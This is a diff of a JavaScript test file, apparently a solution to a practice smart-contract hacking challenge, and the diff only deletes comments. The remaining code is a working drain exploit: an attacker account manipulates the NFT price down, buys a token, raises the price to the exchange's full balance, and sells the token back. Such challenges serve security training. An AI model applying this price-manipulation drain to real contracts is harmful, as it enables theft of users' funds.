@@ -72,18 +72,14 @@
             );
           };
       
-          // lower the NFT prices
           const reducedPrice = ether(`0.1`)
           await changePrice(reducedPrice.toString());
       
-          // Buy an NFT at the price
           await this.exchange.buyOne({ from: attacker, value: reducedPrice });
       
-          // Increase the NFT price to drain all the funds
           const exchangeBalance = await balance.current(this.exchange.address);
           await changePrice(exchangeBalance.toString());
       
-          // approve transferFrom() of 1 DVNFT token then sell it
           await this.token.approve(this.exchange.address, 1, { from: attacker });
           const FIRST_TOKEN_ID = 1;
           await this.exchange.sellOne(FIRST_TOKEN_ID, { from: attacker });
